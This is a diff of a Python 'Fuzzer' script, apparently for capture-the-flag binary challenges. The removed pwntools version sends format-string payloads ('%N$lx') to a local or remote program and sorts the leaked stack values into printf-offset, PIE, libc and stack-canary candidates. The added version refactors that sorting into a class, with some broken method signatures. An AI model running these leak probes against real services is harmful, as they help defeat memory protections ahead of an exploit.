@@ -1,131 +1,88 @@
-# Fuzzer
-from pwn import *
+# Fuzzer $lx
 from termcolor import colored
-import argparse
 
 
-p = 0
+class printf:
 
-# Create the parser
-parser = argparse.ArgumentParser(
-    description="Help Menu", epilog="Enjoy the program! :D")
+    def __init__(self,address):
+        self.result = address # need to be a list of addresses that look like this: AAAAAAA0xf7fceb9c
+        self.offset_for_printf = 0
+        self.potential_canary = []
+        self.potential_libc = []
+        self.potential_pie = []
 
-
-parser.add_argument(
-    "-remote", help="Activate remote server mode --> python3 fuzz.py -remote -ip 0.0.0.0 -port 9999 -cb /path/to/binary", action="store_true")
-
-parser.add_argument(
-    "-local", help="Activate local server mode --> python3 fuzz.py -local -cb /path/to/binary", action="store_true")
-
-
-parser.add_argument(
-    "-ip", help="IP address for the remote server (works with remote mode)")
-parser.add_argument(
-    "-port", help="Port for the remote server (works with remote mode)", type=int)
-
-
-parser.add_argument(
-    "-cb", help="Context Binary for pwntools (always set)", type=str)
-
-parser.add_argument(
-    "-num", help="Number of addresses to be printed", type=int, default=100)
-
-args = parser.parse_args()
-
-local = True
-
-if args.remote:
-    print("Remote server mode is activated.")
-    p = remote(args.ip, args.port)
-    local = False
-elif args.local:
-    print("Local server mode is activated.")
-    # p = process(args.cb)
-
-
-e = context.binary = ELF(args.cb)
-
-context.log_level = 'warning'
-
-
-def print_color(i, color):
-    if i % 2 == 1:
-        print(colored("{:<5} {:<30}".format(str(i)+':',
-              str(result).replace('b', '').replace("'", '')), color))
-    else:
-        print(colored("{:<5} {:<30}".format(str(i)+':',
-              str(result).replace('b', '').replace("'", '')), color), end='\t')
-
-
-ofset_for_printf = 0
-potential_canary = []
-potential_libc = []
-potential_pie = []
-# Let's fuzz x values
-for i in range(args.num):
-    try:
-        if (local):
-            p = process(e.path)
+    def print_color(offset, color,addr):
+        if offset % 2 == 1:
+            print(colored("{:<5} {:<30}".format(str(offset)+':',
+                str(addr).replace('b', '').replace("'", '')), color))
         else:
-            p = remote(args.ip, args.port)
-        #########################################################################CHANGE##THIS#############################################################################################
-        # Format the counter
-        # e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int
-        # or use $s to show strings #change this
-        p.sendlineafter('go?\n', 'AAAAAAAA.%{}$lx'.format(i).encode()) # change this  (8 As on x64  -- 4 As on x32)
-        # Receive the response
-        p.recvuntil('hmm... ')
-        result = p.recvline()
-        result = result.split(b'is')[0].strip()
-        #########################################################################CHANGE##THIS###############################################################################################
-
-        # printf
-        if ('41414141' in str(result)):
-            ofset_for_printf = i
-            print_color(i, "magenta")
-            continue
-
-        # pie
-        if (str(result).split('.')[1][0] == '5' and (str(result).split('.')[1][1] == '5' or str(result).split('.')[1][1] == '6') and str(result)[-2] != '0'):
-            potential_pie.append(i)
-            print_color(i, "green")
-            continue
-        # libc
-        if (str(result).split('.')[1][0] == '7' and str(result).split('.')[1][1] == 'f'):
-            potential_libc.append(i)
-            print_color(i, "blue")
-            continue
-
-        # canary
-        if (str(result)[-2] == '0' and str(result)[-3] == '0' and str(result).split('.')[1][0] != '5 ' and i != ofset_for_printf and str(result).split('.')[1][0] != 'f' and str(result).count('0') <= 4):
-            potential_canary.append(i)
-            print_color(i, "red")
-            continue
-
-        if i % 2 == 1:
-            print("{:<5} {:<30}".format(str(i)+':',
-                  str(result).replace('b', '').replace("'", '')))
-        else:
-            print("{:<5} {:<30}".format(str(i)+':',
-                  str(result).replace('b', '').replace("'", '')), end='\t')
-
-        p.close()
-
-    except EOFError:
-        pass
+            print(colored("{:<5} {:<30}".format(str(offset)+':',
+                str(addr).replace('b', '').replace("'", '')), color), end='\t')
 
 
-print("\n")
 
-if (ofset_for_printf != 0):
-    print("Offset for printf: ", ofset_for_printf,
-          colored("-> PURPLE", "magenta"))
 
-if (len(potential_canary) != 0):
-    print("Potential canary: ", potential_canary, colored("-> RED", "red"))
+    def main(self):
+        print_color=self.print_color
+        addresses=self.result
+        potential_canary=self.potential_canary
+        potential_libc=self.potential_libc
+        potential_pie=self.potential_pie
+        ofset_for_printf=self.offset_for_printf
 
-if (len(potential_pie) != 0):
-    print("Potential PIE: ", potential_pie, colored("-> GREEN", "green"))
+        for offset,result in enumerate(addresses):
+            try:
+                 # printf
+                if ('41414141' in str(result)):
+                    ofset_for_printf = offset
+                    print_color(offset, "magenta", result)
+                else:
+                # pie
+                    if (str(result).split('.')[1][0] == '5' and (str(result).split('.')[1][1] == '5' or str(result).split('.')[1][1] == '6') and str(result)[-2] != '0'):
+                        potential_pie.append(offset)
+                        print_color(offset, "green", result)
+                    else:
+                    # libc
+                        if (str(result).split('.')[1][0] == '7' and str(result).split('.')[1][1] == 'f'):
+                            potential_libc.append(offset)
+                            print_color(offset, "blue", result)
+                        else:
+                
+                        # canary
+                            if (str(result)[-2] == '0' and str(result)[-3] == '0' and str(result).split('.')[1][0] != '5 ' and offset != ofset_for_printf and str(result).split('.')[1][0] != 'f' and str(result).count('0') <= 4):
+                                potential_canary.append(offset)
+                                print_color(offset, "red", result)
+                            else:
+                    
+                                if offset % 2 == 1:
+                                    print("{:<5} {:<30}".format(str(offset)+':',
+                                            str(result).replace('b', '').replace("'", '')))
+                                else:
+                                    print("{:<5} {:<30}".format(str(offset)+':',
+                                            str(result).replace('b', '').replace("'", '')), end='\t')
+            except Exception as e:
+                continue
+        
+        print("\n")
 
-if (len(potential_libc) != 0):
-    print("Potential libc: ", potential_libc, colored("-> BLUE", "blue"))
+        if (ofset_for_printf != 0):
+            print("Offset for printf: ", ofset_for_printf,
+                colored("-> PURPLE", "magenta"))
+
+        if (len(potential_canary) != 0):
+            print("Potential canary: ", potential_canary, colored("-> RED", "red"))
+
+        if (len(potential_pie) != 0):
+            print("Potential PIE: ", potential_pie, colored("-> GREEN", "green"))
+
+        if (len(potential_libc) != 0):
+            print("Potential libc: ", potential_libc, colored("-> BLUE", "blue"))
+
+    
+
+    
+
+
+a=printf(["AAAAAAA41414141"])
+print(a.result)
+print(a.main())
